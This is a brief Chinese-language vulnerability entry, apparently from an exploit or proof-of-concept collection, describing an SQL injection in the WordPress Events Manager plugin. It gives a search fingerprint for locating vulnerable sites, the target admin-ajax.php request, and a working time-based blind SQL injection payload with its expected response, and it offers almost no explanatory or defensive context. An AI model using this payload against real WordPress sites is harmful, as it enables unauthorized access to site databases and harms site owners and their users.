# WordPressEventsManager存在SQL注入漏洞

WordPress ｜ SQL注入 ｜ —
- **指纹**：`body=”/wp-content/plugins/events-manager/”`
- **请求**：`POST /wp-admin/admin-ajax.php HTTP/1.1`

**Payload**
```
action=search_events&orderby=1*(select(sleep(5)))
```
- **响应特征**：200